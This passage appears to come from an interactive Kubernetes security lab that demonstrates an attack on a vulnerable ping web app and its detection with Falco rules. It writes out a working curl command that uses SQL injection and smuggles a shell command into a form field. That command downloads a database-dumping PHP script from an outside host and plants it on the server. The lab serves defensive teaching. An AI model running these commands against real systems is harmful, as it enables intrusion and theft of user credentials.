Once the attacker knows the login details for the database, he could easily write a [small rogue program](https://gist.githubusercontent.com/quique/4630ca1bbd9e7c7d44337d7f132aac8b/raw/00d94164db24b9e53007bee419af0201019f63fe/dump.php), and place it in our server:

`kubectl exec client -n ping -- curl -F "s=OK" -F "user=bad" -F "passwd=wrongpasswd' OR 'a'='a" -F "ipaddr=localhost; curl https://gist.githubusercontent.com/quique/4630ca1bbd9e7c7d44337d7f132aac8b/raw/00d94164db24b9e53007bee419af0201019f63fe/dump.php > /var/www/html/dump.php " -X POST http://ping/ping.php`{{execute}}

Finally, he could invoke his program to get a dump of the database contents, including the table with all our users and their passwords.

`kubectl exec client -n ping -- curl http://ping/dump.php`{{execute}}

Detection with Falco
--------------------

Falco help us detect this kind of attacks thanks to these custom rules:

```yaml
- rule: Apache writing to non allowed directory
  desc: Attempt to write to directories that should be immutable
  condition: open_write and container and k8s.ns.name=ping and k8s.deployment.name=ping and not (ping_allowed_dirs and proc.name in (apache2))
  output: "Writing to forbidden directory (user=%user.name command=%proc.cmdline file=%fd.name)"
  priority: ERROR
  tags: [filesystem]

- rule: Forbidden network outbound connection
  desc: A non-whitelisted process is trying to reach the Internet
  condition: outbound and container and k8s.ns.name=ping and k8s.deployment.name=ping and not proc.name in (ping, apache2)
  output: Forbidden outbound connection (user=%user.name command=%proc.cmdline connection=%fd.name)
  priority: ERROR
  tags: [network]
```

The `open_write` macro is true when a process tries to write to a directory holding system binaries.

The `outbound` macro is true when a network connection to the external world is opened.

Take a look at the logs generated by Falco:

`kubectl logs --selector app=falco | grep Error`{{execute}}

You should see something like:

```log
18:44:04.581760211: Error Writing to forbidden directory (user=www-data command=sh [...] file=/var/www/html/dump.php) [...]
18.44.04.590718953: Error Forbidden outbound connection (user=www-data command=curl https:// [...]
```
